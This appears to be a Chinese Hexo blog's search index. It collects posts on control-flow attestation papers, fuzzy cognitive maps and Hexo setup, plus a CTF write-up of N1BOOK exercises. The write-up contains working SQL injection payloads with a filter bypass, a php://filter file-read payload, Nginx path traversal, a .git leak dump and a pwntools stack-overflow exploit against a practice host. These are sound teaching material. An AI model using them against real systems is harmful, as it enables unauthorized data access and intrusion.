<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>C-FLAT Control-Flow Attestation for Embedded Systems Software</title>
    <url>/2021/05/19/Control-Flow-Attestation-for-Embedded-Systems-Software/</url>
    <content><![CDATA[<h2 id="Keywords"><a href="#Keywords" class="headerlink" title="Keywords"></a>Keywords</h2><p>远程认证；控制流攻击；嵌入式系统安全</p>
<h2 id="Problem-Setting"><a href="#Problem-Setting" class="headerlink" title="Problem Setting"></a>Problem Setting</h2><p><img src="/2021/05/19/Control-Flow-Attestation-for-Embedded-Systems-Software/image-20210519153200738.png" alt="image-20210519153200738"></p>
<ul>
<li>如果通过认证，则进入授权路径；否则进入无授权路径<ul>
<li>授权路径：N1-N2-N5-N4</li>
<li>无授权路径：N1-N3-N6-N4</li>
</ul>
</li>
<li>有控制流漏洞的程序（比如可能存在栈溢出的情况），可能会通过修改某些函数变量的值，间接修改函数返回的地址，这样就会导致程序按非预期的（非授权的）路径运行</li>
</ul>
<h2 id="System-Model"><a href="#System-Model" class="headerlink" title="System Model"></a>System Model</h2><p><img src="/2021/05/19/Control-Flow-Attestation-for-Embedded-Systems-Software/image-20210519160106939.png" alt="image-20210519160106939"></p>
<p><strong>目标：</strong>Ver 希望确定远程嵌入式系统 Prv 的运行时控制流</p>
<ol>
<li>通过静态分析，生成控制流图</li>
<li>测量每个可能的控制流路径，并存到数据库</li>
<li>Ver 向 Prv 发起挑战，Prv 执行一个函数，然后计算被执行的 CFG（控制流图）。这样会生成一个经过认证的数字签名，并存至数据库。</li>
</ol>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇论文的主要工作是提出一种认证，这种控制流认证会使系统的安全控制流程被写入数据库，这个数据库（我认为也可以是其他的一些数据结构）会在我们后续的研究中，比如安全状态观测和动态调整流程或许是有用的。</p>
<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a href="https://dl.acm.org/doi/10.1145/2976749.2978358">https://dl.acm.org/doi/10.1145/2976749.2978358</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>控制流</tag>
      </tags>
  </entry>
  <entry>
    <title>FCM</title>
    <url>/2020/07/30/FCM/</url>
    <content><![CDATA[<h2 id="模糊认知图（Fuzzy-Cognitive-Map，FCM）基本结构与原理"><a href="#模糊认知图（Fuzzy-Cognitive-Map，FCM）基本结构与原理" class="headerlink" title="模糊认知图（Fuzzy Cognitive Map，FCM）基本结构与原理"></a>模糊认知图（Fuzzy Cognitive Map，FCM）基本结构与原理</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><ol>
<li>基本的关系：</li>
</ol>
<p>　　模糊认知图(FCM) = 模糊逻辑(Fuzzy logic) + 神经网络(Neural Network)</p>
<ol start="2">
<li>组成结构[1]</li>
</ol>
<p>　　模糊认知图是有向图，它由表示概念(concept)的节点和带有权值(weight)的弧线组成。模糊认知图中的所有值都是模糊值，比如可以取值：concept value ∈ [0,1]  weight value ∈ [-1,1]。一个concept可以影响其他的concept，同时，可以在构造模糊认知图的过程中不断增减互连关系或concept。一个具有n个概念节点的模糊认知图，可以用一个nxn阶矩阵W唯一确定。</p>
<p><img src="/2020/07/30/FCM/1931211-20200721105224495-580384554.png" alt="img"></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>　　每个concept都代表着系统的一项特征，它们可能用于表征系统中事件、行为、目标等。每个concept的值用一个数字Ai表示，这个值由系统变量的真实值转换而成。</p>
<p>　　两个concept：Ci与Cj之间的关系分三种情况：</p>
<p>　　　　Wij &gt; 0 　Ci与Cj正相关</p>
<p>　　　　Wij &lt; 0 　Ci与Cj负相关</p>
<p>　　　　Wij = 0 　Ci与Cj无因果关系</p>
<p>　　影响当前concept值(Ai)的因素有：该concept前时刻的值Aiold + 所有与它相连的其它concept值乘以权值后的总和。</p>
<p><img src="/2020/07/30/FCM/1931211-20200721121621259-1344638528.png" alt="img"></p>
<p><img src="/2020/07/30/FCM/1931211-20200721132104153-1572744170.png" alt="img"></p>
<h3 id="基本的应用方法"><a href="#基本的应用方法" class="headerlink" title="基本的应用方法"></a>基本的应用方法</h3><ol>
<li><p>首先由<strong>若干</strong>专家确定最适合描述该系统的concept（可以是系统的特征、状态、变量、系统的输入或输出等），并给定一个<strong>模糊值</strong>（fuzzy value）来表征concept之间的互连关系（正/负相关）</p>
</li>
<li><p>以上提到的模糊值（权值）需要考虑：</p>
</li>
</ol>
<p>　　a. 权重的符号，Ci是否会影响Cj</p>
<p>　　b. Ci对Cj的影响程度</p>
<p> 反之亦然。</p>
<ol start="3">
<li><p>然后整合这些专家的意见，此时需要给每位专家一个<strong>信誉值（credibility）</strong>，在整合前，给每位专家的FCM乘以他们对应的信誉值。</p>
</li>
<li><p>经过初始化后的FCM，其中的concept根据设定会相互影响，直到：</p>
</li>
</ol>
<p>　　a. 到达平衡 或</p>
<p>　　b. 到达限定周期 或</p>
<p>　　c. 出现混沌行为</p>
<p>以上的结果是：构造单个FCM</p>
<p>但有时，我们还需构造多个FCM去描述系统的不同模块，然后用类似的方法将它们集成到一个<strong>增强的FCM</strong>中。</p>
<p>tip: 当构造多个不同模块的FCM（如两层FCM）后，其中某个FCM中的部分concept可能会影响其他FCM的concept。</p>
<p><img src="/2020/07/30/FCM/1931211-20200721174650554-753912085.png" alt="img"></p>
<h3 id="训练方法"><a href="#训练方法" class="headerlink" title="训练方法"></a>训练方法</h3><p>目的：调整权值weight</p>
<p>可能的方法：</p>
<p>　　a. Differential Hebbian learning (DHL，微分Hebbian学习方法)是一种无监督的学习方法，未在实际系统中广泛运用[2]。</p>
<p>　　b. Nonlinear Hebbian learning (NHL，非线性Hebbian学习方法)[3]</p>
<p>　　　　非线性 Hebbian 算法是一种无监督权值学习方法，在系统权值学习具有广泛的应用。它利用权值关联的原因节点状态值与结果节点状态值的乘积对连接权值进行无向修正 , 没有其他约束条件来提高学习效率和模型准确度。</p>
<h4 id="四种非监督学习方法-4"><a href="#四种非监督学习方法-4" class="headerlink" title="四种非监督学习方法[4]"></a>四种非监督学习方法[4]</h4><h5 id="1-Signal-Hebbian"><a href="#1-Signal-Hebbian" class="headerlink" title="1. Signal Hebbian"></a>1. Signal Hebbian</h5><ul>
<li>关联局部神经元信号。</li>
<li>如果神经元i和神经元j同步激活，则突触能量增强或突触能量减弱。</li>
</ul>
<h5 id="2-Competitive"><a href="#2-Competitive" class="headerlink" title="2. Competitive"></a>2. Competitive</h5><ul>
<li>用0-1竞争信号（神经元j的信号）调制信号突触差异。</li>
<li>突触只在突触后神经元获胜时才学习。</li>
<li>突触后神经元编码突触前信号模式。</li>
</ul>
<h5 id="3-Differential-Hebbian"><a href="#3-Differential-Hebbian" class="headerlink" title="3. Differential Hebbian"></a>3. Differential Hebbian</h5><ul>
<li>关联信号速度和神经元信号。</li>
<li>通过神经元信号的微分获得信号速度。</li>
</ul>
<h5 id="4-Differential-Competitive"><a href="#4-Differential-Competitive" class="headerlink" title="4. Differential Competitive"></a>4. Differential Competitive</h5><ul>
<li>结合Competitive和Differential Hebbian</li>
<li>仅在有变化时学习</li>
</ul>
<hr>
<h2 id="神经网络的基本结构与原理"><a href="#神经网络的基本结构与原理" class="headerlink" title="神经网络的基本结构与原理"></a>神经网络的基本结构与原理</h2><h3 id="结构-1"><a href="#结构-1" class="headerlink" title="结构"></a>结构</h3><p><img src="/2020/07/30/FCM/1931211-20200721180819407-385103004.png" alt="img"></p>
<h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理[5]"></a>原理[5]</h3><ol>
<li><p>随机生成神经元间的权值</p>
</li>
<li><p>对输入层神经元的数据加权求和再用激励函数激活，得到隐藏层的值</p>
</li>
<li><p>用类似的方法加权求和并激活，得到输出层的值</p>
</li>
<li><p>计算以上得到的输出层的值，与训练集中数据相比的误差大小（误差趋近于0收敛）</p>
</li>
<li><p>根据误差大小，计算残差</p>
</li>
<li><p>输出层残差值加权求和，得到隐藏层的残差</p>
</li>
<li><p>隐藏层残差加权求和。。。</p>
</li>
<li><p>根据残差值调整权值</p>
</li>
</ol>
<h3 id="如何进行训练"><a href="#如何进行训练" class="headerlink" title="如何进行训练"></a>如何进行训练</h3><p>如以上，梯度下降法</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] Stylios C , Georgopoulos V C , Groumpos P P . The Use of Fuzzy Cognitive Maps in Modeling Systems[C]// 5th IEEE Mediterranean Conference on Control and Systems. IEEE, 1997.</p>
<p>[2] 陈宁, 彭俊洁, 王磊,等. 模糊灰色认知网络的建模方法及应用[J]. 自动化学报, 2018, v.44(07):77-86.</p>
<p>[3] Elpiniki Papageorgiou, Chrysostomos Stylios, Peter Groumpos. Fuzzy Cognitive Map Learning Based on Nonlinear Hebbian Rule[M]// AI 2003: Advances in Artificial Intelligence. Springer Berlin Heidelberg, 2003.</p>
<p>[4] Neural Networks and Fuzzy Systems课程ppt</p>
<p>[5] <a href="https://www.cnblogs.com/cxhzy/p/10891137.html">https://www.cnblogs.com/cxhzy/p/10891137.html</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>FCM</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>N1BOOK</title>
    <url>/2020/11/11/N1BOOK/</url>
    <content><![CDATA[<p><font face="楷体" size="4">参考《从0到1 CTFer成长之路》</font>  </p>
<h2 id="第一章-web入门-常见的搜集"><a href="#第一章-web入门-常见的搜集" class="headerlink" title="[第一章 web入门]常见的搜集"></a>[第一章 web入门]常见的搜集</h2><h3 id="先验知识：常见的敏感文件"><a href="#先验知识：常见的敏感文件" class="headerlink" title="先验知识：常见的敏感文件"></a>先验知识：常见的敏感文件</h3><ol>
<li>gedit备份文件，格式为<code>filename~</code>，比如<code>index.php~</code>  </li>
<li>vim备份文件，格式为<code>.filename.swp</code>或者<code>*.swo</code>或者<code>*.swn</code>，比如<code>.index.php.swp</code>  </li>
<li>robots.txt  </li>
<li>还有<code>filename.bak</code>文件</li>
</ol>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ol>
<li>地址后加<code>/index.php~</code>    </li>
</ol>
<p>  <img src="/2020/11/11/N1BOOK/1931211-20201109223222659-122979701.png" alt="img"></p>
<ol start="2">
<li><p><code>/.index.php.swp</code>会即刻下载备份文件，可通过<code>vi index.php</code>建一个只有空格的文件，然后通过<code>vim -r index.php</code>进行恢复即可得到<br> <img src="/2020/11/11/N1BOOK/1931211-20201109225055125-364536216.png" alt="img"></p>
</li>
<li><p><code>/robots.txt</code><br> <img src="/2020/11/11/N1BOOK/1931211-20201109224118439-1125637828.png" alt="img"><br> 查看这个文本文件  </p>
</li>
</ol>
<p>  <img src="/2020/11/11/N1BOOK/1931211-20201109224223273-908316035.png" alt="img"></p>
<p>  综上可得  </p>
<blockquote>
<p>n1book{info_1s_v3ry_imp0rtant_hack}</p>
</blockquote>
<h2 id="第一章-web入门-粗心的小李"><a href="#第一章-web入门-粗心的小李" class="headerlink" title="[第一章 web入门]粗心的小李"></a>[第一章 web入门]粗心的小李</h2><p>git泄露 </p>
<p><img src="/2020/11/11/N1BOOK/1931211-20201109172615955-1966111900.png" alt="img"></p>
<h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><ol>
<li>借助<a href="https://github.com/WangYihang/GitHacker">GitHacker工具</a>  </li>
<li><code>git clone https://github.com/WangYihang/GitHacker.git</code>  </li>
<li><code>cd GitHacker</code>  </li>
<li><code>python Githacker.py http://0fcbe3ec-471a-452a-9e5f-953c5026eb18.node3.buuoj.cn/.git</code><br><img src="/2020/11/11/N1BOOK/1931211-20201109222425300-439745981.png" alt="img">  </li>
<li>进入恢复后的文件夹<code>cd 0fcbe3ec-471a-452a-9e5f-953c5026eb18_node3_buuoj_cn_</code>，有个index.html<br><img src="/2020/11/11/N1BOOK/1931211-20201109222705671-1100399964.png" alt="img">  </li>
<li>浏览器打开index.html即可拿到flag<br><img src="/2020/11/11/N1BOOK/1931211-20201109222803648-1320351443.png" alt="img"><blockquote>
<p>n1book{git_looks_s0_easyfun}</p>
</blockquote>
</li>
</ol>
<h2 id="第一章-web入门-SQL注入-1"><a href="#第一章-web入门-SQL注入-1" class="headerlink" title="[第一章 web入门]SQL注入-1"></a>[第一章 web入门]SQL注入-1</h2><ol>
<li>打开题目链接可以看到<br><img src="/2020/11/11/N1BOOK/1931211-20201111105652234-783984521.png" alt="img"></li>
<li>试试<code>id=1+1</code>的回显，发现和<code>id=1</code>结果相同，所以不是数字型注入，可能是字符型<br><img src="/2020/11/11/N1BOOK/1931211-20201111110017446-1664980143.png" alt="img"></li>
<li>尝试<code>id=1a</code>发现和<code>id=1</code>结果相同，所以确实是字符型<br><img src="/2020/11/11/N1BOOK/1931211-20201111110249600-1227706058.png" alt="img"></li>
<li>尝试用<code>id=1&#39;#</code>，单引号用于闭合前面的单引号，井号用于注释后面预置的单引号。这里<font face="楷体" color="red">注意：#一定要用URL编码，即%23</font>，所以实际上需要输入<code>id=1&#39;%23</code>单引号会被自动转成%27<br><img src="/2020/11/11/N1BOOK/1931211-20201111111203589-1163518685.png" alt="img"></li>
<li>可以成功显示  </li>
<li>优先尝试UNION注入<code>id=-1&#39;union select 1,2,3%23</code>，其中-1是为了使第一行记录无法被查询到，当然，除了-1也可以是一个很大的值比如1024、100等。后面的查询语句是尝试测试哪些字段可以回显<a href="https://blog.csdn.net/weixin_44840696/article/details/89166154">参考</a><br><img src="/2020/11/11/N1BOOK/1931211-20201111112032432-1319004183.png" alt="img"></li>
<li>所以将数字2改成我们想查询的内容：所有表名<code>group_concat(table_name)</code>，<code>group_concat</code>是用<code>,</code>联合多行记录的函数。所以为查询本数据库的其他所有表名，需<code>id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code>，随即看到fl4g<br><img src="/2020/11/11/N1BOOK/1931211-20201111112630199-158278303.png" alt="img"></li>
<li>查询fl4g中的字段名，<code>id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;%23</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111113011837-1925798496.png" alt="img"></li>
<li>获取fllllag的内容，<code>id=-1&#39;union select 1,fllllag,3 from fl4g%23</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111113143857-1970053562.png" alt="img"><blockquote>
<p>n1book{union_select_is_so_cool}</p>
</blockquote>
</li>
</ol>
<h2 id="第一章-web入门-SQL注入-2"><a href="#第一章-web入门-SQL注入-2" class="headerlink" title="[第一章 web入门]SQL注入-2"></a>[第一章 web入门]SQL注入-2</h2><h3 id="先验知识"><a href="#先验知识" class="headerlink" title="先验知识"></a>先验知识</h3><ol>
<li>有的网站会开启错误调试信息方便开发者调试，可以利用报错信息进行<strong>报错注入</strong>  </li>
<li>updatexml第二个参数应为合法XPATH路径，否则会在引发报错的同时输出传入的参数  </li>
<li>dual用于测试数据库是否可以正常使用  </li>
</ol>
<h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><ol>
<li>在连接后加上<code>/login.php</code>，右键查看源码<br> <img src="/2020/11/11/N1BOOK/1931211-20201114180246608-43938250.png" alt="img"></li>
</ol>
<p>  <img src="/2020/11/11/N1BOOK/1931211-20201114175943865-1170585348.png" alt="img">  </p>
<ol start="2">
<li><p>回到登录页面，打开Burp Suite，安装方法<a href="https://www.pianshen.com/article/8533363563/#20_Burp_Suite__57">参考</a>  </p>
</li>
<li><p>推荐浏览器插件：SwitchyOmega，可以省去每次设置代理的步骤，使用BurpSuite时，点击插件选择对应Burp Suite的代理即可<br> <img src="/2020/11/11/N1BOOK/1931211-20201122233423320-7334493.png" alt="img">  </p>
</li>
<li><p>在login界面随便输入用户名和密码如1,1然后点击登录  </p>
</li>
<li><p>可以在Burp Suite中Proxy-&gt;HTTP history看到记录<br> <img src="/2020/11/11/N1BOOK/1931211-20201122234140730-1675769603.png" alt="img">  </p>
</li>
<li><p>CTRL+R，发送到Repeater，在login.php后添加<code>?tips=1</code>，点击Go，看到报错<br> <img src="/2020/11/11/N1BOOK/1931211-20201122234308612-2127113186.png" alt="img">  </p>
</li>
<li><p>用dual进行测试<code>name=1&#39;and updatexml(1,concat(0x7e,(select 1 from dual)),1)#&amp;pass=xxxx</code><br> <img src="/2020/11/11/N1BOOK/1931211-20201122235414244-1226071747.png" alt="img">  </p>
</li>
<li><p>说明存在过滤，将select改成selEct重新发送后回显正常<br> <img src="/2020/11/11/N1BOOK/1931211-20201122235551248-284421726.png" alt="img">  </p>
</li>
<li><p>之后的操作与与SQL注入1同理，将selEct后的1改为group_concat(table_name)，dual改为information_schema.tables where table_schema=database()以查看所有表名<br> <img src="/2020/11/11/N1BOOK/1931211-20201122235936482-283322537.png" alt="img">  </p>
</li>
<li><p>仍与SQL注入1同理，查看fl4g的字段，分别改为group_concat(column_name)和information_schema.columns where table_name=’fl4g’<br><img src="/2020/11/11/N1BOOK/1931211-20201123000206027-1673938152.png" alt="img">  </p>
</li>
<li><p>获取flag，<code>selEct flag from fl4g</code><br><img src="/2020/11/11/N1BOOK/1931211-20201123000312454-163132210.png" alt="img">  </p>
<blockquote>
<p>n1book{login_sqli_is_nice}</p>
</blockquote>
</li>
</ol>
<h2 id="第一章-web入门-afr-1"><a href="#第一章-web入门-afr-1" class="headerlink" title="[第一章 web入门]afr_1"></a>[第一章 web入门]afr_1</h2><h3 id="先验知识-1"><a href="#先验知识-1" class="headerlink" title="先验知识"></a>先验知识</h3><ol>
<li>PHP向用户提供的指定待打开文件的方式，是一个文件流  </li>
<li>PHP的Filter机制，可对目前的协议进行一定的处理，比如将当前文件流的内容进行Base64编码。使用方法<code>php://filter/read=convert.base64-encode/resource=xxx</code>  </li>
<li>利用Filter机制，构造形如以上的攻击数据可以读取文件，拿到各种文件的源码  </li>
</ol>
<h3 id="方法-3"><a href="#方法-3" class="headerlink" title="方法"></a>方法</h3><ol>
<li>点击题目链接<br><img src="/2020/11/11/N1BOOK/1931211-20201115180608275-1525964878.png" alt="img">  </li>
<li><code>p=php://filter/read=convert.base64-encode/resource=hello</code><br><img src="/2020/11/11/N1BOOK/1931211-20201115181019047-1546308797.png" alt="img">  <blockquote>
<p>PD9waHAKCmVjaG8gImhlbGxvIHdvcmxkISI7</p>
</blockquote>
</li>
</ol>
<p><a href="https://tool.oschina.net/encrypt?type=3">Base64解码</a>结果为  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world!&quot;</span>;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>尝试改p，发现<code>p=flag</code>时有回显，所以应该存在这么个文件<br><img src="/2020/11/11/N1BOOK/1931211-20201115180652404-1677628879.png" alt="img">  </p>
</li>
<li><p><code>p=php://filter/read=convert.base64-encode/resource=flag</code><br><img src="/2020/11/11/N1BOOK/1931211-20201115181356049-426897552.png" alt="img">  </p>
<blockquote>
<p>PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</p>
</blockquote>
</li>
<li><p>解码结果为  </p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;no no no&#x27;</span>);</span><br><span class="line"><span class="comment">//n1book&#123;afr_1_solved&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="第一章-web入门-afr-2"><a href="#第一章-web入门-afr-2" class="headerlink" title="[第一章 web入门]afr_2"></a>[第一章 web入门]afr_2</h2><h3 id="先验知识-2"><a href="#先验知识-2" class="headerlink" title="先验知识"></a>先验知识</h3><p>Nginx错误配置可能产生目录穿越漏洞，比如：  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">location /<span class="keyword">static</span> &#123;</span><br><span class="line">    alias /home/myapp/<span class="keyword">static</span>/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于static后没有加/，如果用户请求/static../，拼接到alias进会变成/home/myapp/static/../会穿越到myapp目录  </p>
<h3 id="方法-4"><a href="#方法-4" class="headerlink" title="方法"></a>方法</h3><ol>
<li>点击题目链接<br><img src="/2020/11/11/N1BOOK/1931211-20201115235618945-1220381986.png" alt="img"> </li>
<li>右键查看源码<br><img src="/2020/11/11/N1BOOK/1931211-20201115235644275-1101729838.png" alt="img">  </li>
<li>查看img目录<br><img src="/2020/11/11/N1BOOK/1931211-20201115235800682-1951172374.png" alt="img">  </li>
<li>目录穿越<br><img src="/2020/11/11/N1BOOK/1931211-20201115235824630-1004736249.png" alt="img">  </li>
<li>下载flag，用记事本打开即可  <blockquote>
<p>n1book{afr_2_solved}</p>
</blockquote>
</li>
</ol>
<h2 id="第五章-CTF之RE章-Hello-RE"><a href="#第五章-CTF之RE章-Hello-RE" class="headerlink" title="[第五章 CTF之RE章]Hello, RE"></a>[第五章 CTF之RE章]Hello, RE</h2><p>直接拖到ida64反编译即可看到flag<br><img src="/2020/11/11/N1BOOK/1931211-20201111115333510-1380860265.png" alt="img">  </p>
<blockquote>
<p>n1book{Welcome_to_reversing_world!}  </p>
</blockquote>
<h2 id="第六章-CTF之PWN章-stack"><a href="#第六章-CTF之PWN章-stack" class="headerlink" title="[第六章 CTF之PWN章]stack"></a>[第六章 CTF之PWN章]stack</h2><p>题目提供了libc-2.27.so和stack，根据经验知道这题环境是Ubuntu18，需要进行堆栈平衡  </p>
<ol>
<li><code>checksec stack</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111204026170-317361439.png" alt="img">  </li>
<li>IDA64反编译，并查看<code>main</code>函数  </li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li><p>进一步查看<code>vuln</code>，发现栈溢出漏洞<br> <img src="/2020/11/11/N1BOOK/1931211-20201111204429141-497488314.png" alt="img">  </p>
</li>
<li><p>双击变量<code>v1</code>查看栈信息，所以当覆盖<code>&#39;a&#39;*18</code>后即可到达函数返回地址<br> <img src="/2020/11/11/N1BOOK/1931211-20201111204527280-1969476305.png" alt="img">  </p>
</li>
<li><p>同时注意到IDA64的函数窗口有个<code>shell</code>，查看以下发现<br> <img src="/2020/11/11/N1BOOK/1931211-20201111204818419-1089495331.png" alt="img"> </p>
</li>
<li><p>所以需要将<code>shell</code>的地址0x覆盖到<code>vuln</code>的返回地址即可。由于前面提到需要堆栈平衡，我们还要知道shell的ret地址<br> <img src="/2020/11/11/N1BOOK/1931211-20201111205501285-1592593146.png" alt="img"></p>
</li>
</ol>
<p>  <img src="/2020/11/11/N1BOOK/1931211-20201111205403033-1732093910.png" alt="img">  </p>
<ol start="7">
<li>综上，有exp如下  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./stack&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25413</span>)</span><br><span class="line">shell = <span class="number">0x400537</span></span><br><span class="line">retn = <span class="number">0x40054e</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">18</span> + p64(retn) + p64(shell)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()         </span><br></pre></td></tr></table></figure>

<ol start="8">
<li><code>python exp.py</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111205701121-1124011515.png" alt="img">  <blockquote>
<p>n1book{851939e4e90b864b8d20fe6228564522}</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>N1BOOK</tag>
      </tags>
  </entry>
  <entry>
    <title>论文研读 2021-05-19</title>
    <url>/2021/05/19/QianPaper/</url>
    <content><![CDATA[<h1 id="程序运行模型"><a href="#程序运行模型" class="headerlink" title="程序运行模型"></a>程序运行模型</h1><h2 id="函数运行模型"><a href="#函数运行模型" class="headerlink" title="函数运行模型"></a>函数运行模型</h2><ul>
<li>将程序分解为每一个函数的状态的组合</li>
<li>函数内部运行一个独立的<strong>自动机</strong></li>
<li>每一个函数的自动机组合在一起形成整个程序的自动机</li>
</ul>
<h3 id="自动机构建"><a href="#自动机构建" class="headerlink" title="自动机构建"></a>自动机构建</h3><ul>
<li>静态生成：链表存放函数状态转移</li>
<li>动态生成：函数运行的过程中动态生成自动机。可以减少特征值存放所需要的空间，但是遇到某些未加入状态的正常函数会产生误报。</li>
</ul>
<h2 id="动态完整性度量方法"><a href="#动态完整性度量方法" class="headerlink" title="动态完整性度量方法"></a>动态完整性度量方法</h2><ul>
<li>程序进入新函数时，度量模块就会将函数调用者对应的调用序列压栈保存，并新建空间保存当前序列</li>
<li>函数运行过程中，度量模块记录程序这段时间的调用，作为度量内容</li>
<li>函数运行结束后，度量模块已经记录函数运行序列，并将其与函数自动机比对，验证度量是否成功</li>
<li>度量符合则继续运行，不符合则结束运行</li>
<li>程序返回上一个函数，并将原先保存的序列出栈，继续以上过程，直到程序结束</li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>Qian 的这篇文章，其实本质上和我们提的方法是一样的。但是这种形式化的描述方法，算法的描述都非常值得借鉴学习！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Lee 发来的一篇不知篇名的文章（未检索到相关信息）</p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
      </tags>
  </entry>
  <entry>
    <title>Ref</title>
    <url>/2021/05/09/Ref/</url>
    <content><![CDATA[<h2 id="5-1-4-主题安装"><a href="#5-1-4-主题安装" class="headerlink" title="5.1.4 主题安装"></a>5.1.4 主题安装</h2><h3 id="安装参考"><a href="#安装参考" class="headerlink" title="安装参考"></a>安装参考</h3><p><a href="https://www.qcmoke.site/blog/hexo_next.html">hexo+next打造精美的个人博客网站 | Qcmoke’s Blog</a></p>
<p><a href="https://www.jianshu.com/p/94b332d22115">hexo+gitee免费搭建个人博客 - 简书 (jianshu.com)</a></p>
<h3 id="hexo-s-的问题解决"><a href="#hexo-s-的问题解决" class="headerlink" title="hexo s 的问题解决"></a>hexo s 的问题解决</h3><p>由于 8.4.0 存在很多未知问题（实际上是我太菜，不知道怎么解决），所以还是回到 5.1.4。但是 5.1.4 也存在一些问题，比如 <code>hexo s</code>后查看本地   <a href="http://localhost:4000/">http://localhost:4000</a> 回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;_layout.swig&#x27; %&#125; &#123;% import &#x27;_macro/post.swig&#x27; as post_template %&#125; &#123;% import &#x27;_macro/sidebar.swig&#x27; as sidebar_template %&#125; &#123;% block title %&#125;&#123;&#123; config.title &#125;&#125;&#123;% if theme.index_with_subtitle and config.subtitle %&#125; - &#123;&#123;config.subtitle &#125;&#125;&#123;% endif %&#125;&#123;% endblock %&#125; &#123;% block page_class %&#125; &#123;% if is_home() %&#125;page-home&#123;% endif -%&#125; &#123;% endblock %&#125; &#123;% block content %&#125;</span><br><span class="line">&#123;% for post in page.posts %&#125; &#123;&#123; post_template.render(post, true) &#125;&#125; &#123;% endfor %&#125;</span><br><span class="line">&#123;% include &#x27;_partials/pagination.swig&#x27; %&#125; &#123;% endblock %&#125; &#123;% block sidebar %&#125; &#123;&#123; sidebar_template.render(false) &#125;&#125; &#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>这个问题的解决方法在该项目 <a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a>  issue 中找到：手动安装 swig </p>
<ul>
<li><code>npm i hexo-renderer-swig</code></li>
<li><code>hexo c</code></li>
<li><code>hexo g</code></li>
<li><code>hexo c</code></li>
</ul>
<h3 id="菜单栏无法识别问题"><a href="#菜单栏无法识别问题" class="headerlink" title="菜单栏无法识别问题"></a>菜单栏无法识别问题</h3><p>类似 <code>Cannot GET /%20</code> 的问题，是因为主题的<code>_congif.yml</code> 文件中菜单栏的设置多个空格，官方默认的 <code>home: / || home</code>是错的，应该是 <code>home: /|| home</code></p>
<h3 id="图片不显示的问题"><a href="#图片不显示的问题" class="headerlink" title="图片不显示的问题"></a>图片不显示的问题</h3><p><a href="https://www.cnblogs.com/gispathfinder/p/12239390.html">参考</a> ，这是 hexo-asset-image 的 bug，需要对<code>Blog\node_modules\hexo-asset-image\index.js</code>进行如下修改，即可正常显示</p>
<p><img src="/2021/05/09/Ref/image-20210510174338088.png" alt="image-20210510174338088"></p>
